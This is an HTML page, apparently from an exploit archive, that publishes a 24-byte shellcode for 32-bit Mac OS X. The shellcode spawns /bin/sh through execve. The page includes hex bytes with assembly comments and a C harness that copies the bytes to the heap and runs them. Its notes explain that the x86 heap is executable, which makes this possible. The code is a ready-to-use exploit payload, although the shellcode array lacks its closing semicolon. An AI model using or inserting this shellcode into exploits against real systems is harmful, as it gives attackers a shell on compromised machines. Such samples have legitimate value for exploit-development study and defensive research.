<html><head><title>Osx/x86 - execve(/bin/sh) - 24 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
Title : OSX/x86 intel - execve(/bin/sh) - 24 bytes
Type : Shellcode
Author : Simon Derouineau - simon.derouineau [AT] ingesup.com
Platform : Mac OSX/Intel. Tested on 10.6.4 Build 10F569

Informations : This code has to be compiled with gcc -m32 switch  on 10.6.0+

More informations : x86-64 code is more secured than x86 code on OSX platform : 
Canaries are added, Stack and heap are non-executable, etc.

Also, cat /var/db/dyld/dyld_shared_cache_x86_64.map shows that no memory can be 
mapped with WX flags, while it's possible with x86 code ( according to  /var/db/dyld/dyld_shared_cache_i386.map).

The method used here is the easier one, heap is executable in x86 applications, 
as described in &quot;The Mac Hacker's Handbook&quot;, written by Charlie Miller.

The trick is to memcopy the shellcode to the heap before executing it.

*/


#include &lt;stdio.h&gt; 
#include &lt;stdlib.h&gt; 
#include &lt;string.h&gt;



char shellcode[]= 	&quot;\x31\xC0&quot; 			// xor eax,eax
			&quot;\x50&quot;				// push eax
			&quot;\x68\x2F\x2F\x73\x68&quot;		// push dword
			&quot;\x68\x2F\x62\x69\x6E&quot;		// push dword 
			&quot;\x89\xE3&quot;			// mov ebx,esp
			&quot;\x50\x50\x53&quot;			// push eax, push eax, push ebx
			&quot;\xB0\x3B&quot;			// mov al,0x3b
			&quot;\x6A\x2A&quot;			// push byte 0x2a
			&quot;\xCD\x80&quot;			// int 0x80


int main(int argc, char *argv[]){
void (*f)(); 
char *x = malloc(sizeof(shellcode));
memcpy(x, shellcode, sizeof(shellcode));
f = (void (*)()) x;
f();
}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
